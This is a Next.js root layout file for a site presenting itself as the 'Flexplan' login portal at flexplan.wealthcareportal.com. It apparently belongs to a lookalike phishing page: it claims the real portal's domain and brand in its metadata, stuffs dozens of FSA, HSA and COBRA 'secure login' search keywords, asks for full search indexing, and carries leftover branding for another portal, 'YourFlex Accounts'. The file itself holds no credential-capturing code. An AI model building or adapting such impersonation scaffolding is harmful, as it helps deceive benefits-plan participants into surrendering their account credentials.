import type React from "react";
import type { Metadata } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://flexplan.wealthcareportal.com/Authentication/Handshake";
const SITE_DOMAIN = "flexplan.wealthcareportal.com";
const SITE_BRAND = "Flexplan";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "Flexplan - Login",
    template: "%s | Flexplan",
  },
  keywords: [
  "FlexPlan",
  "FlexPlan login",
  "FlexPlan employee portal",
  "FlexPlan benefits portal",
  "FlexPlan account access",
  "FlexPlan participant login",
  "FlexPlan secure login",
  "FlexPlan reimbursement account",
  "FlexPlan member portal",
  "FlexPlan claims portal",
  "FlexPlan FSA login",
  "FlexPlan HSA login",
  "FlexPlan COBRA login",
  "FlexPlan dependent care account",
  "FlexPlan healthcare reimbursement",
  "FlexPlan participant dashboard",
  "flexplan.wealthcareportal.com",
  "WealthCare Portal",
  "WealthCare Portal login",
  "WealthCare participant portal",
  "WealthCare secure sign in",
  "wealthcareportal.com login",
  "employee benefits portal",
  "employee benefits login",
  "benefits login",
  "benefits account access",
  "participant benefits portal",
  "employer benefits portal",
  "employee reimbursement portal",
  "healthcare spending account",
  "flexible spending account login",
  "FSA login",
  "health savings account login",
  "HSA login",
  "COBRA login",
  "dependent care reimbursement",
  "health benefits",
  "secure login",
  "secure account access",
  "online benefits management",
  "benefits claims submission",
  "benefits administration platform",
  "participant dashboard",
  "healthcare expense management",
  "reimbursement account",
  "tax-advantaged benefits",
  "handshake authentication",
  "multi-factor authentication",
  "secure participant authentication",
],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flexplan.`,

  authors: [{ name: "Flexplan" }],
  creator: "Flexplan",
  publisher: "Flexplan",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "Flexplan - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flexplan.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/fplak.jpg",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "Flexplan - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flexplan.`,
    images: ["/fplak.jpg"],
  },
  icons: {
    icon: "/fplak.jpg",
    shortcut: "/fplak.jpg",
    apple: "/fplak.jpg",
  },
  viewport: {
    width: "device-width",
    initialScale: 1,
    maximumScale: 5,
  },
  themeColor: "#254650",
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
  publisher: {
    "@type": "Organization",
    name: "YourFlex Accounts",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
